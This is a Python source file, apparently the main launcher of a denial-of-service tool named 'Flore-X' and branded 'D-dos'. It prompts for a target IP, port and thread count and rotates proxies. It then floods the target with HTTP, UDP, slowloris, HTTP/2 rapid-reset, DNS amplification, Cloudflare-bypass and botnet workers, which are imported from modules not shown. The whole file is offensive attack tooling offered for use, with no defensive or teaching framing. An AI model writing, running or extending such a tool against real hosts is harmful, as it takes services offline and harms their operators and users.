#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Flore-X - S.P.S TEAM - @S_P_I_D_E_YYYY

import time, threading
from concurrent.futures import ThreadPoolExecutor

from core.proxy import fetch_proxies, validate_proxies, auto_refresh_proxies, PROXIES
from core.attacks import http_worker, udp_worker, slowloris_worker, rapid_reset_worker, dns_amp_worker, cf_bypass_worker
from core.botnet import botnet_worker

sent = 0
failed = 0
lock = threading.Lock()
running = True

def main():
    global running
    
    print("""\033[91m
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   \033[93m███████╗██╗      \033[96m██████╗ \033[93m██████╗ \033[96m███████╗     \033[93m██╗  ██╗\033[91m           ║
║   \033[93m██╔════╝██║     \033[96m██╔═══██╗\033[93m██╔══██╗\033[96m██╔════╝     \033[93m╚██╗██╔╝\033[91m           ║
║   \033[93m█████╗  ██║     \033[96m██║   ██║\033[93m██████╔╝\033[96m█████╗        \033[93m╚███╔╝\033[91m            ║
║   \033[93m██╔══╝  ██║     \033[96m██║   ██║\033[93m██╔══██╗\033[96m██╔══╝        \033[93m██╔██╗\033[91m            ║
║   \033[93m██║     ███████╗\033[96m╚██████╔╝\033[93m██║  ██║\033[96m███████╗     \033[93m██╔╝ ██╗\033[91m           ║
║   \033[93m╚═╝     ╚══════╝\033[96m ╚═════╝ \033[93m╚═╝  ╚═╝\033[96m╚══════╝     \033[93m╚═╝  ╚═╝\033[91m           ║
║                                                                      ║
║   \033[95m❤️  SPIDEY X CHEAT\033[91m              \033[95m⚔️ FLORE-X \033[91m            ║
║   \033[95m👤 @S_P_I_D_E_YYYY\033[91m              \033[95m💀 D-dos\033[91m                   ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝\033[0m
""")
    
    host = input("\033[96m🎯 Target IP: \033[0m").strip()
    port = int(input("\033[96m🔌 Port [443]: \033[0m") or 443)
    threads = int(input("\033[96m🧵 Threads [500]: \033[0m") or 500)
    
    print(f"\n\033[93m[+] Loading proxies...\033[0m")
    fetch_proxies()
    validate_proxies()
    threading.Thread(target=auto_refresh_proxies, daemon=True).start()
    
    total = threads * 7
    print(f"\n\033[91m🔥 Attacking {host}:{port} | {total} threads\033[0m\n")
    
    with ThreadPoolExecutor(max_workers=total) as executor:
        for _ in range(threads):
            executor.submit(http_worker, host, port, lock)
            executor.submit(udp_worker, host, port, lock)
            executor.submit(slowloris_worker, host, port, lock)
            executor.submit(rapid_reset_worker, host, port, lock)
            executor.submit(dns_amp_worker, host, port, lock)
            executor.submit(cf_bypass_worker, host, port, lock)
            executor.submit(botnet_worker, host, port, lock)
    
    start = time.time()
    try:
        while True:
            time.sleep(1)
            with lock:
                from core.attacks import sent as s, failed as f
                elapsed = time.time() - start
                print(f"\r\033[92m✅ {s:,}\033[0m | \033[91m❌ {f:,}\033[0m | \033[96m⚡ {s/elapsed:.0f}/s\033[0m | \033[93m🌐 {len(PROXIES)} proxies\033[0m", end="")
    except KeyboardInterrupt:
        print(f"\n\n\033[91m⏹️ Stopped\033[0m")

if __name__ == "__main__":
    main()
